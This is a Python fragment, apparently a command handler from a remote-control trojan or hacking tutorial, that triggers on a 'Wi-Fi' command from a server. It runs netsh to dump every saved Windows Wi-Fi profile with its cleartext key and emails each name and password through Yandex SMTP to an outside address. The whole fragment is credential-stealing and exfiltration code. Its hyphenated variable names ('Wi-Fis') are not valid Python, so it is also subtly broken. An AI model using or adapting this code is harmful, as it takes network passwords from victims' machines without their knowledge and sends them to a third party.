if server_command == 'Wi-Fi':



data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('cp866').split('\n')

Wi-Fis = [line.split(':')[1][1:-1] for line in data if "Все профили пользователей" in line]



for Wi-Fi in Wi-Fis:

results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', Wi-Fi, 'key=clear']).decode('cp866').split('\n')

results = [line.split(':')[1][1:-1] for line in results if "Содержимое ключа" in line]

try:

email = 'xakepmail@yandex.ru'

password = '***'

dest_email = 'demo@xakep.ru'

subject = 'Wi-Fi'

email_text = (f'Name: {Wi-Fi}, Password: {results[0]}')



message = 'From: {}\nTo: {}\nSubject: {}\n\n{}'.format(email, dest_email, subject, email_text)



server = smtp.SMTP_SSL('smtp.yandex.com')

server.set_debuglevel(1)

server.ehlo(email)

server.login(email, password)

server.auth_plain()

server.sendmail(email, dest_email, message)

server.quit()

except IndexError:

email = 'xakepmail@yandex.ru'

password = '***'

dest_email = 'demo@xakep.ru'

subject = 'Wi-Fi'

email_text = (f'Name: {Wi-Fi}, Password not found!')



message = 'From: {}\nTo: {}\nSubject: {}\n\n{}'.format(email, dest_email, subject, email_text)



server = smtp.SMTP_SSL('smtp.yandex.com')

server.set_debuglevel(1)

server.ehlo(email)

server.login(email, password)

server.auth_plain()

server.sendmail(email, dest_email, message)

server.quit()
